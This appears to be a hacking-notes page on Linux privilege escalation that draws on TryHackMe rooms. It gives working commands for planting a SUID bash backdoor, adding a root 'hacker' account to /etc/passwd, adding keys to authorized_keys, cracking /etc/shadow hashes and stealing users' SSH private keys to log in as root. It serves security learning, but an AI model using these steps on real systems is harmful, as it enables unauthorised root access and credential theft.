---
description: >-
  Go from a low privilege user, to a higher one to gain access to thing you're
  not supposed to
---

# Linux Privilege Escalation

If a system has been set up well, you might not instantly get all the privileges on the machine when you get in. It's pretty common to have a web server run as a low-privilege user, so if it ever gets hacked the attacker might not be able to do much on the server.

The point of Privilege Escalation is to abuse features of the system to execute commands as more privileged users, and thus escalating your own privileges on the system.​ Most of the information was from the Linux PrivEsc rooms on TryHackMe:

{% embed url="https://tryhackme.com/room/linprivesc" %}
First PrivEsc room with some basic techniques
{% endembed %}

{% embed url="https://tryhackme.com/room/linuxprivesc" %}
Second Privesc room with more advanced techniques and a lot of detail
{% endembed %}

## Getting Shells

Often in privilege escalation, you're letting a high-privilege user execute some command. Sometimes you can't directly execute a shell as that user and have to run some other command to send a way to get a shell somewhere. One simple way is to just execute a reverse shell as that user. Then you will get a privileged reverse shell in your listener. See [#reverse-shells](../hacking-linux-boxes.md#reverse-shells "mention") for some examples of this.&#x20;

Another easy way if you already have access to the box, is to create a [suid.md](suid.md "mention") binary of bash that the target user is the owner of. The safest way to do this is to first copy /bin/bash to another location, which will make the owner of the file the user that executed the command. Then to later get back those privileges just add the SUID bit with `chmod +s` to take over the privileges of the owner when you execute the program as a low-privilege user.&#x20;

{% code title="Let target execute:" %}
```shell
cp /bin/bash /tmp/bash; chmod +xs /tmp/bash
```
{% endcode %}

<pre class="language-shell-session" data-title="Low-privilege user"><code class="lang-shell-session"><strong>$ /tmp/bash -p  # -p to maintain privileges
</strong># id
uid=1000(user) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
</code></pre>

### Write files

If you can only write to files, without running commands, you can write to some specific locations to later execute commands. If you can append data to a file, try adding a root user to `/etc/passwd` with a password that you know yourself. Then you can log in as that user and get root privileges:

<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ openssl passwd hacker  # Generate password
</strong>aQeFa8LxllpT.
</code></pre>

Then if you somehow append this following line to the `/etc/passwd` file, you will be able to log in as root using the password "hacker":

```shell
hacker:aQeFa8LxllpT.:0:0:root:/root:/bin/bash
```

<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ su hacker
</strong>Password: hacker
# id
uid=0(root) gid=0(root) groups=0(root)
</code></pre>

If the box uses SSH, another way would be to append your own public key to the `.ssh/authorized_keys` file in their home directory. This allows you access to the user via SSH because you were explicitly allowed to. Just `cat` out your own `~/.ssh/id_rsa.pub` starting with `ssh-rsa`, and copy it to a new line in the `.ssh/authorized_keys` file. Then you are allowed to log in simply using SSH:

```shell-session
$ ssh root@$IP
```

{% hint style="warning" %}
Default installations of SSH don't allow logging in as `root`. To check this look at the `PermitRootLogin` option in `/etc/ssh/sshd_config`:

```shell-session
$ grep PermitRootLogin /etc/ssh/sshd_config
PermitRootLogin yes
```
{% endhint %}

### Read files

Being able to read files as a privileged user can allow you to read sensitive information. The first is the shadow hashes in `/etc/shadow`, which you can then copy to your own machine to crack (See more info in [#cracking-shadow-hashes](../../cryptography/hashing/cracking-hashes.md#cracking-shadow-hashes "mention")). Then if you have cracked a password you can just log in as that user using `su`:

<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ su root
</strong>Password: password123
# id
uid=0(root) gid=0(root) groups=0(root)
</code></pre>

Another common file to read is SSH private keys. These are located in the user's home directory in a `.ssh` folder. To find the home directory for a user you can check `/etc/passwd`:

<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ cat /etc/passwd | awk -F: '{print $1, $6}'
</strong>root /root
...
www-data /var/www
user /home/user
</code></pre>

This folder often contains an `id_rsa` file which is only readable by the user, but contains the private key that can be used to log into SSH as that user. When you are able to read this file, copy it to your attacking machine and use `ssh -i` to use the private key:

<pre class="language-shell-session" data-title="Attacker"><code class="lang-shell-session"><strong>$ cat id_rsa  # Saved private key
</strong>-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAtc7FngGLGz9oReOq2b7k2grTgvQGtP+Yax3it73ZGuxASVKq
...
BAmcHcSorWfiOeasmS2HsoAqsBJr8DqDVAo4274CYxZooDqq+6Rimg==
-----END RSA PRIVATE KEY-----
<strong>$ chmod 600 id_rsa  # Set correct permissions to allow SSH to use it
</strong><strong>$ ssh -i id_rsa root@$IP
</strong># id
uid=0(root) gid=0(root) groups=0(root)
</code></pre>
